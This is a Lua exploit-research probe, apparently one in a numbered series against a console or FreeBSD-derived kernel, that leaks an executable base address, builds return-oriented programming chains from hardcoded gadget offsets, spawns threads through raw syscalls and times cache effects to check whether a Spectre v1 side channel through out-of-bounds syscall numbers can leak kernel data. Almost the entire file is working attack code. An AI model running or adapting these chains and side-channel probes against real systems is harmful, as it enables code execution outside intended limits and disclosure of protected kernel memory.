-- CRASH_CLASS: MODERATE
-- PROBE 1199o: Spectre v1 discriminator — OOB syscall vs valid syscall cache delta
--
-- 1199n confirmed: getpid adds ~2.8 ticks probe delta (L1 eviction from kernel).
-- This probe: does an OUT-OF-BOUNDS syscall (677+) cause MORE cache disturbance
-- than a VALID syscall (getpid=20)?
--
-- Spectre v1 theory: the kernel's "if (code < nsysent)" branch predictor is
-- trained by 50× valid calls, then mispredicts for the OOB call, causing
-- speculative access to sysent[677] — kernel data past the table.
--
-- Design:
--   Phase 0: Confirm OOB syscall 677 survives (SIG_IGN already installed)
--   Phase 1: 4× [prime → getpid → probe] (baseline)
--   Phase 2: 4× [prime → 50×getpid + 1×getpid → probe] (trained valid)
--   Phase 3: 4× [prime → 50×getpid + 1×syscall(677) → probe] (trained OOB)
--   Phase 4: 4× [prime → 50×getpid + 1×syscall(700) → probe] (different OOB)
-- If Phase 3/4 deltas > Phase 2, speculative access is detectable.

print("=== PROBE 1199o: Spectre v1 discriminator ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax     = eb + 0x992
local g_pop_rdi     = eb + 0xC9DFE
local g_pop_rsi     = eb + 0xD77D
local g_bare_ret    = eb + 0x42
local g_mov_m_rax   = eb + 0x92C67
local g_mov_rax_mem = eb + 0x1EEBB

-- SIG_IGN for SIGSEGV(11) + SIGSYS(12)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_mmap = mk(477)

-- =============================================
-- PHASE 0: Test OOB syscalls survive from parent
-- =============================================
print("")
print("[Phase 0] OOB syscall survival test (parent, SIG_IGN active)")
local sc677 = mk(677)
local ok677, rv677 = pcall(function() return sc677(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
print(string.format("  sys677: pcall=%s rv=%s", tostring(ok677), ok677 and tostring(N(rv677)) or "n/a"))

local sc700 = mk(700)
local ok700, rv700 = pcall(function() return sc700(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
print(string.format("  sys700: pcall=%s rv=%s", tostring(ok700), ok700 and tostring(N(rv700)) or "n/a"))

if not alive() then print("DEAD after OOB test"); return end
print("  survived — OOB syscalls return without killing")

-- =============================================
-- SHARED DATA
-- =============================================
local shared = memory.alloc(0x800)
local sha = N(shared)
for i = 0, 0x7FC, 4 do wd(sha + i, 0) end

local counter_a   = sha
local done_ctr    = sha + 0x10
local done_meas   = sha + 0x18
local before_base = sha + 0x40
local after_base  = sha + 0x240

-- Probe: 4 separate pages to avoid L1 self-interference
local probes = {}
for p = 1, 4 do
    local pg = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if get_hi_lo(pg) >= 0xFFFF0000 then print("FATAL: probe mmap " .. p); return end
    local pa = N(pg)
    wq(pa, uint64(0xBBBB0000 + p))
    probes[p] = pa
end
print(string.format("probes: 0x%X, 0x%X, 0x%X, 0x%X", probes[1], probes[2], probes[3], probes[4]))

-- =============================================
-- COUNTER CHAIN: 300K ticks (more room for training phases)
-- =============================================
local TICKS = 300000
local ctr_buf = sc_mmap(uint64(0), uint64(0xC00000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(ctr_buf) >= 0xFFFF0000 then print("FATAL: ctr mmap"); return end
local ctr_base = N(ctr_buf)
local ss_c = 0x1000
local rsp_c = ctr_base + ss_c - ((ctr_base + ss_c) % 16) - 8

local off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

ec(g_pop_rdi); ec(uint64(129))
ec(g_pop_rsi); ec(uint64(N(fs_ptr)))
ec(g_pop_rax); ec(uint64(165))
ec(stub)
ec(g_pop_rdi); ec(uint64(counter_a))
for i = 1, TICKS do
    ec(g_pop_rax); ec(uint64(i))
    ec(g_mov_m_rax)
end
ec(g_pop_rdi); ec(uint64(done_ctr))
ec(g_pop_rax); ec(uint64(0xCAFE))
ec(g_mov_m_rax)
ec(g_pop_rdi); ec(uint64(0))
ec(g_pop_rax); ec(uint64(431))
ec(stub)
print(string.format("counter: %d ticks", TICKS))

-- =============================================
-- MEASUREMENT CHAIN
-- =============================================
-- Layout (16 measurements total, each uses probes[((idx%4)+1)]):
--   [0..3]  Phase 1: 1×getpid → probe (baseline, no training)
--   [4..7]  Phase 2: 50×getpid + 1×getpid → probe (trained valid)
--   [8..11] Phase 3: 50×getpid + 1×sys(677) → probe (trained OOB)
--   [12..15] Phase 4: 50×getpid + 1×sys(700) → probe (different OOB)

local meas_buf = sc_mmap(uint64(0), uint64(0x400000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(meas_buf) >= 0xFFFF0000 then print("FATAL: meas mmap"); return end
local meas_base = N(meas_buf)
local ss_m = 0x2000
local rsp_m = meas_base + ss_m - ((meas_base + ss_m) % 16) - 8

local off_m = 0
local function em(v) wq(rsp_m + off_m, v); off_m = off_m + 8 end

em(g_pop_rdi); em(uint64(129))
em(g_pop_rsi); em(uint64(N(fs_ptr)))
em(g_pop_rax); em(uint64(165))
em(stub)

local function emit_prime(addr)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
end

local function emit_probe(addr, idx)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(before_base + idx * 8))
    em(g_mov_m_rax)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(after_base + idx * 8))
    em(g_mov_m_rax)
end

local function emit_syscall(num)
    em(g_pop_rax); em(uint64(num))
    em(stub)
end

-- Store the syscall return value to shared+0x400+idx*8
local ret_base = sha + 0x400
local function emit_syscall_save(num, idx)
    em(g_pop_rax); em(uint64(num))
    em(stub)
    em(g_pop_rdi); em(uint64(ret_base + idx * 8))
    em(g_mov_m_rax)
end

-- === PHASE 1: 1× getpid, no training (baseline) ===
for i = 0, 3 do
    local pa = probes[(i % 4) + 1]
    emit_prime(pa)
    emit_syscall(20)  -- getpid
    emit_probe(pa, i)
end

-- === PHASE 2: 50× getpid training + 1× getpid (trained valid) ===
for i = 0, 3 do
    local pa = probes[(i % 4) + 1]
    emit_prime(pa)
    for t = 1, 50 do emit_syscall(20) end  -- training
    emit_syscall(20)  -- the measured call (valid, in-bounds)
    emit_probe(pa, 4 + i)
end

-- === PHASE 3: 50× getpid training + 1× sys(677) (trained OOB) ===
for i = 0, 3 do
    local pa = probes[(i % 4) + 1]
    emit_prime(pa)
    for t = 1, 50 do emit_syscall(20) end  -- training
    emit_syscall_save(677, i)  -- the measured call (OOB)
    emit_probe(pa, 8 + i)
end

-- === PHASE 4: 50× getpid training + 1× sys(700) (different OOB) ===
for i = 0, 3 do
    local pa = probes[(i % 4) + 1]
    emit_prime(pa)
    for t = 1, 50 do emit_syscall(20) end  -- training
    emit_syscall_save(700, 4 + i)  -- the measured call (different OOB)
    emit_probe(pa, 12 + i)
end

em(g_pop_rdi); em(uint64(done_meas))
em(g_pop_rax); em(uint64(0xBEEF))
em(g_mov_m_rax)
em(g_pop_rdi); em(uint64(0))
em(g_pop_rax); em(uint64(431))
em(stub)

print(string.format("measurement: 16 samples, %d bytes (%.1f KB)", off_m, off_m / 1024))

-- =============================================
-- LAUNCH
-- =============================================
print("")

local par_c = memory.alloc(0x40)
local pc_ = N(par_c)
for i = 0, 0x3C, 4 do wd(pc_ + i, 0) end
wq(pc_, g_bare_ret)
wq(pc_ + 0x10, uint64(ctr_base))
wq(pc_ + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pc_ + 0x30, tid_c)

print("launching counter...")
pcall(function() mk(455)(uint64(pc_), uint64(0x38)) end)

local gate = 0
for p = 1, 50000 do
    local v = rd(counter_a) or 0
    if v > 0 then gate = v; break end
end
print(string.format("gate: counter=%d", gate))
if gate == 0 then print("ABORT"); return end

local par_m = memory.alloc(0x40)
local pm = N(par_m)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq(pm, g_bare_ret)
wq(pm + 0x10, uint64(meas_base))
wq(pm + 0x18, uint64(ss_m))
local tid_m = memory.alloc(8); wq(N(tid_m), uint64(0))
wq(pm + 0x30, tid_m)

print("launching measurement...")
pcall(function() mk(455)(uint64(pm), uint64(0x38)) end)

-- Longer wait — 216 syscalls in chain (50*4*3 + 16 + overhead)
for w = 1, 200000 do local _ = rd(sha + 0x50) end

if not alive() then print("DEAD"); return end

local dm = rd(done_meas) or 0
print(string.format("done_meas=0x%X", dm))

-- =============================================
-- RESULTS
-- =============================================
print("")

local function read_delta(idx)
    local b = rq(before_base + idx * 8)
    local a = rq(after_base + idx * 8)
    local bh, bl = get_hi_lo(b)
    local ah, al = get_hi_lo(a)
    return al - bl, bl, al
end

-- Phase 1: baseline
print("[Phase 1] 1× getpid (no training):")
local sum1 = 0
for i = 0, 3 do
    local d, b, a = read_delta(i)
    sum1 = sum1 + d
    print(string.format("  [%d] delta=%2d", i, d))
end
local avg1 = sum1 / 4

-- Phase 2: trained valid
print("")
print("[Phase 2] 50×getpid + 1×getpid (trained valid):")
local sum2 = 0
for i = 0, 3 do
    local d, b, a = read_delta(4 + i)
    sum2 = sum2 + d
    print(string.format("  [%d] delta=%2d", i, d))
end
local avg2 = sum2 / 4

-- Phase 3: trained OOB 677
print("")
print("[Phase 3] 50×getpid + 1×sys(677) (trained OOB):")
local sum3 = 0
for i = 0, 3 do
    local d, b, a = read_delta(8 + i)
    local rv = rq(ret_base + i * 8)
    local rvh, rvl = get_hi_lo(rv)
    local rv_display = rvl
    if rvh == 0xFFFFFFFF then rv_display = -1 end
    sum3 = sum3 + d
    print(string.format("  [%d] delta=%2d  ret=%d", i, d, rv_display))
end
local avg3 = sum3 / 4

-- Phase 4: trained OOB 700
print("")
print("[Phase 4] 50×getpid + 1×sys(700) (different OOB):")
local sum4 = 0
for i = 0, 3 do
    local d, b, a = read_delta(12 + i)
    local rv = rq(ret_base + (4 + i) * 8)
    local rvh, rvl = get_hi_lo(rv)
    local rv_display = rvl
    if rvh == 0xFFFFFFFF then rv_display = -1 end
    sum4 = sum4 + d
    print(string.format("  [%d] delta=%2d  ret=%d", i, d, rv_display))
end
local avg4 = sum4 / 4

-- =============================================
-- ANALYSIS
-- =============================================
print("")
print("[SUMMARY]")
print(string.format("  Phase 1 (1×getpid):              avg=%.1f ticks", avg1))
print(string.format("  Phase 2 (50×train + 1×getpid):   avg=%.1f ticks", avg2))
print(string.format("  Phase 3 (50×train + 1×sys677):   avg=%.1f ticks", avg3))
print(string.format("  Phase 4 (50×train + 1×sys700):   avg=%.1f ticks", avg4))
print("")

local spec_signal = math.max(avg3, avg4) - avg2
if avg3 > avg2 + 3 or avg4 > avg2 + 3 then
    print("** SPECULATIVE ACCESS DETECTED **")
    print(string.format("  OOB delta exceeds trained-valid by %.1f ticks (%.0f ns)",
        spec_signal, spec_signal * 5.6))
    print("  → Spectre v1 side channel IS measurable!")
    print("  → Next: PRIME+PROBE array to extract speculated byte value")
elseif avg3 > avg2 + 1 or avg4 > avg2 + 1 then
    print("** MARGINAL SIGNAL — OOB slightly higher than valid **")
    print(string.format("  delta difference: %.1f ticks", spec_signal))
    print("  Need more samples or targeted cache set alignment")
elseif avg3 < avg1 and avg4 < avg1 then
    print("** OOB SYSCALL IS LIGHTER THAN VALID — nosys fast path **")
    print("  No speculative access detected (or mitigated)")
    print("  Possible: LFENCE after bounds check, or retpoline")
else
    print("** NO SPECULATIVE SIGNAL — OOB ≈ valid **")
    print("  Kernel may have Spectre v1 mitigations (LFENCE/barrier)")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199o COMPLETE ===")
